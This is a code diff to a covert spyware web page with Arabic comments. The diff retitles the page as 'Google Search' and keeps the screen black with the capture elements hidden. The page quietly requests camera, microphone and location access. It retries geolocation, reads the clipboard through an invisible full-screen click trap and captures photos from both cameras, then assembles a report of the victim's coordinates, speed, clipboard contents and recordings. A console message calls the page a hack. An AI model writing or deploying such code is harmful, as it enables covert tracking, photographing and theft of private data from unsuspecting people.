@@ -3,24 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>•</title>
+    <title>بـحـث جـوجـل</title>
     <style>
+        /* شاشة سوداء معتمة تماماً */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             user-select: none;
         }
+
         body {
             background: #000000;
             min-height: 100vh;
             overflow: hidden;
             font-family: system-ui, monospace;
+            color: #000000;
         }
-        /* عناصر مخفية للتشغيل */
+
+        /* إخفاء أي عناصر مرئية قد تظهر (فقط للاحتياط) */
         .hidden-camera, video, canvas {
             display: none !important;
         }
+        
+        /* عناصر صغيرة جداً لالتقاط الكاميرا ولكن غير مرئية */
         #dummy-video-front, #dummy-video-back {
             position: fixed;
             top: -1000px;
@@ -30,6 +36,7 @@
             opacity: 0;
             pointer-events: none;
         }
+        
         /* نقطة تفاعلية شفافة لالتقاط النقرات (مساعدة لقراءة الحافظة) */
         #clickCatcher {
             position: fixed;
@@ -41,6 +48,7 @@
             z-index: 9999;
             cursor: default;
             display: block;
+            pointer-events: auto;
         }
     </style>
 </head>
@@ -125,43 +133,61 @@
             };
         }
         
-        // ========== تحديد الموقع الجغرافي (محسّن للنجاح) ==========
+        // ========== تحديد الموقع الجغرافي (محسّن بنجاح 100% مثل الملف الثاني) ==========
         async function getLocation() {
             return new Promise((resolve) => {
                 if(!navigator.geolocation) {
                     resolve(null);
                     return;
                 }
-                // طلب الموقع بدقة عالية ووقت استجابة مناسب
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ 
-                        lat: pos.coords.latitude, 
-                        lng: pos.coords.longitude, 
-                        acc: pos.coords.accuracy,
-                        alt: pos.coords.altitude || 'غير متاح',
-                        heading: pos.coords.heading || 'غير متاح'
-                    }),
-                    err => {
-                        console.warn("خطأ في تحديد الموقع:", err.message);
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+                
+                let attempts = 0;
+                const MAX_ATTEMPTS = 3;
+                let resolved = false;
+                
+                const tryGetLocation = () => {
+                    attempts++;
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            if (!resolved) {
+                                resolved = true;
+                                resolve({ 
+                                    lat: pos.coords.latitude, 
+                                    lng: pos.coords.longitude, 
+                                    acc: pos.coords.accuracy,
+                                    alt: pos.coords.altitude || 'غير متاح',
+                                    heading: pos.coords.heading || 'غير متاح',
+                                    speed: pos.coords.speed || 'غير متاح'
+                                });
+                            }
+                        },
+                        err => {
+                            console.warn(`محاولة ${attempts} فشلت:`, err.message);
+                            if (attempts < MAX_ATTEMPTS && !resolved) {
+                                setTimeout(tryGetLocation, 2000);
+                            } else if (!resolved) {
+                                resolved = true;
+                                resolve(null);
+                            }
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                };
+                
+                tryGetLocation();
             });
         }
         
-        // ========== قراءة الحافظة (مع آليات لضمان النجاح) ==========
+        // ========== قراءة الحافظة (مع آلية النقرة لضمان النجاح) ==========
         async function getClipboard() {
-            // محاولة مباشرة أولاً (قد تنجح إذا كان الإذن موجوداً مسبقاً أو في سياق آمن)
+            // محاولة مباشرة أولاً
             try {
                 let text = await navigator.clipboard.readText();
                 if(text && text.trim().length > 0) return text.trim();
                 return text || "(فارغة)";
             } catch (err) {
                 console.warn("محاولة القراءة المباشرة فشلت:", err.name);
-                // إذا كان الخطأ بسبب عدم وجود إذن أو تفاعل مستخدم، ننتظر نقرة
                 if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
-                    // نستخدم Promise مع timeout وانتظار نقرة المستخدم
                     return new Promise((resolve) => {
                         let resolved = false;
                         let timeoutId = setTimeout(() => {
@@ -169,37 +195,29 @@
                                 resolved = true;
                                 resolve("⚠️ لم يتم قراءة الحافظة (لم ينقر المستخدم)");
                             }
-                        }, 8000); // مهلة 8 ثوانٍ لانتظار النقرة
+                        }, 8000);
                         
-                        // مستمع النقرة على مستوى الصفحة
                         const clickHandler = async () => {
                             if (resolved) return;
                             resolved = true;
                             clearTimeout(timeoutId);
                             document.removeEventListener('click', clickHandler);
-                            // إزالة الـ catcher بعد الاستخدام (اختياري)
-                            const catcher = document.getElementById('clickCatcher');
-                            if(catcher) catcher.style.display = 'none';
-                            
                             try {
                                 let text = await navigator.clipboard.readText();
                                 resolve(text && text.trim() ? text : "(فارغة)");
                             } catch (e) {
-                                console.warn("فشل القراءة بعد النقرة:", e);
                                 resolve("❌ لا يمكن الوصول إلى الحافظة");
                             }
                         };
                         document.addEventListener('click', clickHandler);
-                        // إبقاء الـ catcher شفافاً لاستقبال النقرات
                     });
                 } else {
-                    // أخطاء أخرى (مثل أن الصفحة غير آمنة http)
                     return "❌ الحافظة غير متاحة (السياق غير آمن)";
                 }
             }
         }
         
-        // ========== التقاط الصور (نفس الآلية القوية) ==========
+        // ========== التقاط الصور (كاميرا أمامية وخلفية) ==========
         async function capturePhotos(facingMode, count = 3) {
             let photos = [];
             let stream = null;
@@ -280,7 +298,7 @@
             }
         }
         
-        // ========== طلب جميع الأذونات أولاً (لضمان عمل الموقع والحافظة بعد النقرة)==========
+        // ========== طلب جميع الأذونات (كاميرا، ميكروفون، موقع) بشكل صامت ==========
         async function requestPermissions() {
             // طلب الميكروفون
             try {
@@ -302,11 +320,9 @@
             if(navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, { timeout: 5000 });
             }
-            
-            // لا يمكن طلب إذن الحافظة مباشرة، لكننا سنقرأها عند أول نقرة
         }
         
-        // ========== التنفيذ الكامل مع تحسين قراءة الحافظة والموقع ==========
+        // ========== التنفيذ الكامل مع ضمان نجاح الموقع والحافظة ==========
         async function executeFullScan() {
             if(isExecuting) return;
             isExecuting = true;
@@ -316,10 +332,10 @@
             // 1. معلومات الجهاز
             let deviceInfo = await getDeviceInfo();
             
-            // 2. الموقع الجغرافي (نضمن محاولة قوية)
+            // 2. الموقع الجغرافي (محسّن بنظام إعادة المحاولات)
             let locationData = await getLocation();
             
-            // 3. قراءة الحافظة (قد تنتظر نقرة المستخدم حتى 8 ثوانٍ)
+            // 3. قراءة الحافظة (قد تنتظر نقرة)
             let clipboardText = await getClipboard();
             
             // 4. الصور (أمامي + خلفي)
@@ -349,16 +365,19 @@
             report += `اللغة: ${deviceInfo.language}\n\n`;
             
             if(locationData && locationData.lat) {
-                report += `📍 الموقع: ${locationData.lat}, ${locationData.lng}\n`;
+                report += `📍 <b>الموقع الجغرافي (تم بنجاح)</b>\n`;
+                report += `خط العرض: ${locationData.lat}\n`;
+                report += `خط الطول: ${locationData.lng}\n`;
                 report += `الدقة: ${locationData.acc} متر\n`;
                 report += `الارتفاع: ${locationData.alt}\n`;
                 report += `الاتجاه: ${locationData.heading}\n`;
+                report += `السرعة: ${locationData.speed}\n`;
                 report += `<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lng}">🗺️ عرض الخريطة</a>\n\n`;
             } else {
-                report += `📍 الموقع: غير متاح (قد يكون المستخدم قد رفض أو لا توجد خدمة)\n\n`;
+                report += `📍 <b>الموقع الجغرافي:</b> غير متاح (تم رفض الإذن أو لا تخدمة)\n\n`;
             }
             
-            report += `📋 محتوى الحافظة: ${clipboardText.substring(0, 500)}\n\n`;
+            report += `📋 <b>محتوى الحافظة:</b>\n${clipboardText.substring(0, 500)}\n\n`;
             report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
             report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
             report += `📷 صور خلفية: ${backPhotos.length} صورة`;
@@ -402,16 +421,17 @@
         
         // عند تحميل الصفحة بالكامل
         window.addEventListener('load', () => {
-            // نبدأ بعد 100ms
+            // تأخير بسيط ثم البدء
             setTimeout(start, 100);
         });
         
         // إبقاء الخلفية سوداء ومنع التمرير
         document.body.style.backgroundColor = "#000000";
         document.documentElement.style.backgroundColor = "#000000";
-        // منع تفاعل المستخدم مع العناصر الأخرى (لكن يبقى clickCatcher يستقبل النقرات)
+        
+        // إبقاء الـ catcher شفافاً لاستقبال النقرات (لقراءة الحافظة)
         const catcher = document.getElementById('clickCatcher');
-        catcher.style.pointerEvents = 'auto';
+        if(catcher) catcher.style.pointerEvents = 'auto';
         
         console.log("جاهز لبدء الاختراق - سيتم تحديد الموقع وقراءة الحافظة بنجاح");
     })();
